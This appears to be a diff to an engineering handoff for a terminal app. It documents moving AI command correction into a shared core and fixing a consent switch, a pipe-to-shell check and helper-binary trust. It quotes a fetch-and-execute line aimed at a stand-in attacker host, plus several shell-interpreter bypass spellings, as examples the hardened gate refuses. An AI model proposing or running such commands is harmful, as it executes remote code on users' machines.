@@ -1,6 +1,8 @@
 # Engineering handoff
 
-Updated: 2026-08-29 (shared AI chat store; the quit-path write that erased the saved chat library)
+Updated: 2026-08-29 (shared review-first command correction; the consent switch that
+surface never read; the shared AI chat store and the quit-path write that erased the
+saved chat library)
 
 This baseline exact-pins the hardened shared core and jagent revisions and now carries
 native bounded OSC 8 interaction, hardened app-owned helper processes, and a tested
@@ -10,6 +12,157 @@ lifecycle identities and cell boundaries are checked, finalized rows own a real 
 stale UI targets fail closed, and automatic helper resolution no longer trusts `PATH`.
 
 ## Completed since the previous handoff
+
+- **Shared review-first command correction, and the consent switch this surface
+  never read (2026-08-29)**: the four terminals each carried a private copy of
+  the "that command failed, here is a fix" flow — anvil 1,817 lines, forge
+  2,148, ember 2,335, frost 1,552 — and the engine half of all four imported no
+  toolkit code at all. It is now `jterm_core::command_correction` (3,937 lines
+  including tests, pinned here at
+  `badcce222fb5471a6afbfc5d5e898e2bc3faf632`), and `src/command_correction.rs`
+  is a 424-line shim: 229 insertions against 1,357 deletions in that file, plus
+  108/87 in `main.rs`. The whole engine moved — the narrow classifier, token
+  extraction and ranking, the safety gate, the prompt and its strict-JSON reply
+  parser, the supervised probes, both resolvers and every constant. What stayed
+  is exactly three things: the policy frost constructs the engine with, the
+  per-pane request registry, and the iced card in `main.rs`.
+
+  This surface decides whether a model-proposed command may be *offered for
+  execution* next to a pre-filled, auto-focused prompt field, so the divergence
+  between the four copies was not a style question. Three of the differences
+  were live holes, each present in some copies and absent in others, and frost
+  was on the wrong side of two of them.
+
+  **The consent switch.** `ai_share_command_context` is frost's explicit
+  authorisation to send command context to a non-local provider, and this is
+  the surface that sends the largest payload of any of them: the failed command
+  line, the working directory, and up to 8 KiB of captured terminal output.
+  frost honours that switch in `ai_chats`, in `ai_command`'s block context and
+  in `agent_task_ui`'s Codex gate — and did not consult it here at all. It now
+  reaches the engine as `ContextSharing`, built per request because the value is
+  live config, and the engine's prompt builder demands a `ConsentProof`, so a
+  withheld policy cannot assemble the payload rather than merely declining to
+  send it. **The user-visible consequence is the largest in this round: with
+  `ai_share_command_context` off — which is the default — the AI fallback goes
+  silent.** A user who has `command_correction_enabled = true` and the sharing
+  switch off now sees strictly fewer cards, and only ones backed by evidence
+  gathered on this machine: the target's own suggested spelling, this host's APT
+  index, and this host's executable PATH. Those three resolvers never left the
+  machine and keep working unchanged. Turning the sharing switch on restores the
+  AI fallback exactly as it behaved before.
+
+  **A candidate could add a pipe into a shell.** The gate compared
+  `syntax_markers` as a superset test, and that only asks whether a marker is
+  *present*: against an original that already contains a pipe, appending `| sh`
+  introduces no new marker, and `sh` is in neither the privilege list
+  (`sudo`/`doas`/`su`) nor the remote list (`ssh`/`mosh`/`scp`/`sftp`). So a
+  failing `curl -sS https://example.invalid/setup | head -20` could be answered
+  with `curl -sS https://evil.invalid/x | sh` and frost would render it in the
+  card with the original's own exit code above it. frost had no check at all
+  here; forge had one, as four literal spellings, which `|  sh` with two spaces,
+  `| /bin/sh`, `| zsh` and `| python3` all walk past. The shared rule splits the
+  pipeline quote-aware and compares the *set* of interpreters its stages run, so
+  `| xargs sh -c` and `| $SHELL` are refused too, while `ls | gerp foo` →
+  `ls | grep foo` is still offered; a core test pins that interpreter set against
+  `jagent::safety::is_interpreter` so the two cannot drift apart.
+
+  **Helper trust is the one frost got right**, and it went into the union
+  unchanged rather than being merged away. anvil and ember asked
+  `owner == euid || mode & 0o022 != 0` and forge asked the same in `host.rs`, so
+  a binary owned by a *third* user at mode 0755 answered "not untrusted" to all
+  three — and helper resolution reached it by scanning the user's own `PATH`, so
+  a hostile `bash` planted earlier on `PATH` on a shared machine was spawned
+  automatically by any failed command. Clamping the child's `PATH` never helped,
+  because the helper is itself the hostile binary. The same expression inverted
+  for root, refusing every system helper when the terminal runs as root and
+  silently killing APT-verified corrections in containers. frost resolved
+  `bash` and `apt-cache` only from fixed absolute candidates under
+  `jterm_core::helper`'s predicate, which answers both halves; that is now
+  `HelperStrategy::FixedCandidates`, stated at construction instead of
+  inherited. frost pays no new cost for it and gains none: the price of a closed
+  candidate list — no APT evidence on a non-FHS host that keeps `apt-cache`
+  somewhere else — is the price frost was already paying, and it is the right
+  trade for a probe that spawns automatically on any failed command.
+
+  Three legitimate disagreements became construction-time policy with no
+  `Default` where safety is involved, following the `BusyChatPolicy` precedent
+  from the chat-store round. frost states all three: `LocalEvidence::SameNamespace`
+  (frost launches every PTY natively — no Flatpak, no host bridge, no sandbox —
+  so this process's `PATH` really is the namespace the failed command resolved
+  against, which anvil and forge must not claim), `HelperStrategy::FixedCandidates`
+  above, and `ContextSharing` from the live switch. There is no way to omit one
+  and still compile: `CorrectionPolicy::new` takes all three positionally,
+  `CompletionFacts::trusted_completion` is a required field, `correction_prompt`
+  demands the consent witness, and `Original`/`Candidate` newtypes make the
+  argument swap — which frost's old `validate_candidate(original, candidate)`
+  could only catch by review — uncompilable.
+
+  The card keeps its layout, its two paste policies, its Escape scoping and its
+  submission channel, and changes in five ways a user will notice. Its reason
+  line is now engine-sanitised and whitespace-collapsed: frost interpolated the
+  provider's `message` raw into `text()` directly above the editable, pre-filled,
+  auto-focused command field, so a reply carrying U+202E could reverse the
+  rendered order of the text beside it; a bidi override now renders as U+FFFD.
+  It gained the `⚠ destructive: {reason}` label frost's Agent approval card
+  already had, recomputed against the live draft on every keystroke —
+  `is_dangerous` never gated whether a candidate is *offered*, only the
+  direct-run decision, which is already false for every unverified proposal, so
+  a reply proposing `rm -rf ~/work` reached this card in exactly the chrome
+  `git status` got. A failed command line longer than 16 KiB is no longer
+  classified at all; frost previously classified, ranked, probed and prompted
+  about a 200 KiB pasted one-liner on a surface whose own declared budget is
+  16 KiB. A verified proposal whose draft differs from the resolver's output
+  only by leading or trailing whitespace now runs directly instead of
+  downgrading to "Insert for review", because the button's label
+  (`run_allowed`) and the accept path (`accept`) now take the run-versus-insert
+  decision from the same validated string; they used to disagree, one comparing
+  the raw field text and the other the trimmed one. And inline feedback is
+  bounded to one line of 200 characters on the way in — frost's own three
+  feedback strings were short and app-authored, but this is the card's one
+  remaining channel for text the engine did not write, and the obvious shim
+  pairing `Err(e) => set_feedback(…{e})` would put a provider-shaped
+  `serde_json` error, which echoes its input back verbatim, one line above the
+  command field.
+
+  The trigger is now one decision in the engine. `should_start(enabled, facts)`
+  owns the toggles, the missing exit status, the output sample and the narrow
+  classifier; frost supplies only the two facts it alone knows, as named fields
+  rather than positional arguments — `agent_issued` (an Agent-approved command
+  already went through review, and correcting it would compete with the Agent's
+  own loop) and `trusted_completion` (a boundary-inferred completion attributes
+  stale scrollback and a guessed status to a command, so the classifier would
+  read "command not found" out of the *previous* command's output). frost's own
+  `enabled` gate is still answered first, before the facts are built, purely
+  because `CompletionFacts` takes the block output by value and a block holds up
+  to `MAX_CAPTURED_OUTPUT_BYTES`; with the feature off, which is the default,
+  that would otherwise be an 8 MiB clone per finished `ls`. Pre-sampling instead
+  would be wrong, because the engine samples and sampling a sample elides real
+  content a second time. One more resolver change is user-visible: the `PATH`
+  directory walk that supplies candidate names now ignores relative and empty
+  `PATH` entries, so opening a project whose directory sits on a relative `PATH`
+  element can no longer contribute its filenames as correction candidates.
+
+  Fifteen of the file's twenty-three tests are gone because the engine they
+  covered is gone; the eight that remain are the per-pane registry's four
+  (generation replacement, per-pane isolation, exact-generation dismissal,
+  deadline expiry), the card's accept-path wiring, and three new ones that pin
+  what frost now states: its evidence and helper policy, the consent switch in
+  both positions, and the trigger's two frost-supplied refusals. Both policy
+  tests were mutation-checked, and the mutations were rerun while writing this:
+  flipping `FixedCandidates` to `TrustedPathScan` in `correction_policy` fails
+  `frost_states_a_native_namespace_and_fixed_helper_candidates`, and inverting
+  the consent mapping fails `the_consent_switch_reaches_the_engine`. The third
+  mutation the migration claimed — renaming the probe thread — does **not** turn
+  the suite red, and that is worth stating plainly: the assertion is
+  `format!("{policy:?}").contains(PROBE_THREAD_NAME)`, so renaming the constant
+  renames both sides of the comparison. It does catch the failure that matters
+  more (passing some other literal to `CorrectionPolicy::new` fails it), but it
+  cannot detect a wrong name, which is the cost of there being no accessor to
+  read — see the release-boundary note below.
+  Three adversarial audits ran against the shared module before
+  any app adopted it and found eight defects in it, including that the merged
+  pipe rule was still forge's four-spelling substring match; all eight were
+  fixed with regression tests that fail when the fix is reverted.
 
 - **Shared AI chat store, and the quit path that erased the saved library
   (2026-08-29)**: frost's in-progress AI chats panel had grown a private copy of
@@ -652,8 +805,9 @@ The AI chats panel, the AI command suggestion, and their shared-store shim
 (`src/ai_chats.rs`, `src/ai_chat_store.rs`, `src/ai_command.rs`, and the
 `src/main.rs` wiring) are still uncommitted work in progress, carried into this
 round rather than produced by it. The dependency half of that is now settled:
-`Cargo.toml` pins `jterm_core` at `1a04f1ef0d24cce7083cbbbb2efa7e34c02bdfcb`,
-the commit that introduces `jterm_core::ai::chat_store`, with `jagent`
+`Cargo.toml` pins `jterm_core` at `badcce222fb5471a6afbfc5d5e898e2bc3faf632`,
+the commit that adds `jterm_core::command_correction` on top of the
+`jterm_core::ai::chat_store` revision the previous round pinned, with `jagent`
 `f9383ec56c7c94f1e25ba6fbeb17fa5e47132abf` beneath it. The temporary local
 `[patch]` used to develop the two together is gone, `Cargo.lock` carries real
 `source = "git+…"` lines again, and the gate below was rerun with `--locked`
@@ -661,6 +815,43 @@ against the published revisions. What remains uncommitted is frost's own
 panel code. Until then the panel is absent from
 README's shortcut table on purpose: the chord is settled family-wide, but
 nothing here is shipped behavior yet.
+
+Three things the correction migration did not do, none of them papered over.
+
+frost's shim cannot hermetically build a `CorrectionCandidate` carrying verified
+(`AptIndex` / `ExecutablePath`) evidence, so its card-wiring test exercises only
+the insert-only branch. `CorrectionCandidate::new` is private and every public
+path to one — `parse_ai_reply`, `deterministic_candidate`,
+`resolve_correction_blocking` — yields `AiUnverified` or `TargetOutput` unless a
+real APT or PATH probe runs and matches, which is not hermetic on a build host.
+That narrowness is deliberate and is exactly what makes it impossible for a shim
+to render prose the gate never saw, so the fix is not to widen it: a
+`#[cfg(feature = "test-fixtures")]` or `#[doc(hidden)]` constructor would let
+each shim prove its own "Run verified command" branch. The invariant itself is
+covered upstream by the core's
+`the_primary_actions_label_and_its_action_never_disagree`.
+
+The policy test reads the probe thread name off `format!("{policy:?}")` rather
+than an accessor, because `CorrectionPolicy::probe_thread_name` is private with
+no getter while `evidence()` and `context_sharing()` both have one. Two costs,
+both measured rather than assumed: the assertion is coupled to a `derive`, and
+because it compares the Debug output against `PROBE_THREAD_NAME` itself, it
+proves only that that constant is what `correction_policy` passes — renaming the
+constant renames both sides and the test stays green, so a thread name that no
+longer says "frost" would not be caught. A one-line
+`pub fn probe_thread_name(&self) -> &'static str` upstream, asserted against a
+literal here, would fix both.
+
+`CompletionFacts::output` takes the finished block's output by value, so an
+enabled correction feature clones up to `MAX_CAPTURED_OUTPUT_BYTES` per finished
+command. The core is explicit that a shim must pass the output whole and must
+not pre-sample, and the field is `String`, so the only mitigation available here
+was to short-circuit on frost's own `enabled` gate before building the facts
+(`src/main.rs`, `maybe_start_command_correction`) — which means the default
+configuration pays nothing, while an agent-issued or boundary-inferred
+completion with the feature on still copies the whole block. `output: &str` with
+`should_start` sampling from the borrow would remove the copy without weakening
+the trigger; that is a core change and outside this repo.
 
 The panel also has no "ask about the selected block" entry — the Agent panel
 already owns that surface — so the store's `BlockContext` stays
@@ -678,3 +869,10 @@ bash -n scripts/install.sh scripts/uninstall.sh scripts/test-install-paths.sh
 shellcheck scripts/install.sh scripts/uninstall.sh scripts/test-install-paths.sh
 bash scripts/test-install-paths.sh
 ```
+
+The three Rust gates were rerun for this round with `--locked` against the published
+`jterm_core` `badcce2`: `cargo fmt --all -- --check` reports no diff, Clippy is silent
+at `-D warnings`, and the suite is 1,006 passing with zero failures. Fifteen of the
+twenty-three tests in `src/command_correction.rs` are gone with the engine they
+covered; the install-path and packaging checks above were not rerun, because this
+round touched no script, desktop file or metadata.
